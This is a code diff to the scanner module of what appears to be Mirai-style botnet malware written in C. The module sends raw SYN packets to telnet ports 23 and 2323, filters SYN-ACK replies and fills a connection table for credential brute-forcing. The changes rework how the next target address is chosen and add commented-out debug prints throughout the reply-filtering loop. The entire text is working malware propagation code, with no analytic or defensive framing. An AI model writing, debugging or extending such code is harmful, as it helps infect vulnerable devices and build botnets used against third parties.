@@ -34,28 +34,12 @@
 
 ipv4_t get_next_target(void) 
 { 
-    int fd;
-    struct ifreq ifr;
-    ipv4_t target_ip;
+    ipv4_t next_addr = util_local_addr() | (1 << 24);
 
-    fd = socket(AF_INET, SOCK_DGRAM, 0);
-
-    /* I want to get an IPv4 IP address */
-    ifr.ifr_addr.sa_family = AF_INET;
-
-    /* I want IP address attached to "eth0" */
-    strncpy(ifr.ifr_name, NETWORK_INTERFACE, IFNAMSIZ-1);
-
-    ioctl(fd, SIOCGIFADDR, &ifr);
-
-    close(fd);
-
-    /* display result */
-    target_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr | (1 << 24);
 #ifdef DEBUG
-    printf("[scanner] Target IP [%x]\n", target_ip);
+    // printf("[scanner] next_addr %d.%d.%d.%d\n", next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
 #endif
-    return target_ip;
+    return next_addr;
 } 
 
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
@@ -98,9 +82,15 @@ void scanner_init(void)
         return;
 
     LOCAL_ADDR = util_local_addr();
+#ifdef DEBUG
+    // printf("[scanner] LOCAL_ADDR %d.%d.%d.%d\n", LOCAL_ADDR & 0xff, (LOCAL_ADDR >> 8) & 0xff, (LOCAL_ADDR >> 16) & 0xff, (LOCAL_ADDR >> 24) & 0xff);
+#endif
 
     rand_init();
     fake_time = time(NULL);
+#ifdef DEBUG
+    // printf("[scanner] fake_time %d\n", fake_time);
+#endif
     conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
     for (i = 0; i < SCANNER_MAX_CONNS; i++)
     {
@@ -230,7 +220,7 @@ void scanner_init(void)
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
         struct timeval tim;
-        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
+        int last_avail_conn, last_spew = 0, mfd_rd = 0, mfd_wr = 0, nfds;
         ipv4_t next_addr;
 
         // Spew out SYN to try and get a response
@@ -295,28 +285,84 @@ void scanner_init(void)
             errno = 0;
             n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 111 n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK\n");
+#endif
                 break;
+            }
 
             if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
+            {
+#ifdef DEBUG
+                // printf("[scanner] 222 n %d < %d, \n", n, sizeof(struct iphdr) + sizeof(struct tcphdr));
+#endif
                 continue;
+            }
             if (iph->daddr != LOCAL_ADDR)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 333 iph->daddr %d.%d.%d.%d\n", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
+#endif
                 continue;
+            }
             if (iph->protocol != IPPROTO_TCP)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 444 iph->protocol %d\n", iph->protocol);
+#endif
                 continue;
+            }
             if (tcph->source != htons(23) && tcph->source != htons(2323))
+            {
+#ifdef DEBUG
+                // printf("[scanner] 555 tcph->source %d\n", tcph->source);
+#endif
                 continue;
+            }
             if (tcph->dest != source_port)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 666 tcph->dest %d, source_port %d\n", tcph->dest, source_port);
+#endif
                 continue;
+            }
             if (!tcph->syn)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 777 tcph->syn %d\n", tcph->syn);
+#endif
                 continue;
+            }
             if (!tcph->ack)
+            {
+
+#ifdef DEBUG
+                // printf("[scanner] 888 tcph->ack %d\n", tcph->ack);
+#endif
                 continue;
+            }
             if (tcph->rst)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 999 tcph->rst %d\n", tcph->rst);
+#endif
                 continue;
+            }
             if (tcph->fin)
+            {
+#ifdef DEBUG
+                // printf("[scanner] 000 tcph->fin %d\n", tcph->fin);
+#endif
                 continue;
+            }
             if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
+            {
+#ifdef DEBUG
+                // printf("[scanner] aaa tcph->ack_seq %d, iph->saddr %d\n", tcph->ack_seq, iph->saddr);
+#endif
                 continue;
+            }
 
             conn = NULL;
             for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
@@ -325,13 +371,21 @@ void scanner_init(void)
                 {
                     conn = &conn_table[n];
                     last_avail_conn = n;
+#ifdef DEBUG
+                    // printf("[scanner] bbb conn_table[%d].state == SC_CLOSED\n", n);
+#endif
                     break;
                 }
             }
 
             // If there were no slots, then no point reading any more
             if (conn == NULL)
+            {
+#ifdef DEBUG
+                // printf("[scanner] ccc conn is NULL\n");
+#endif
                 break;
+            }
 
             conn->dst_addr = iph->saddr;
             conn->dst_port = tcph->source;
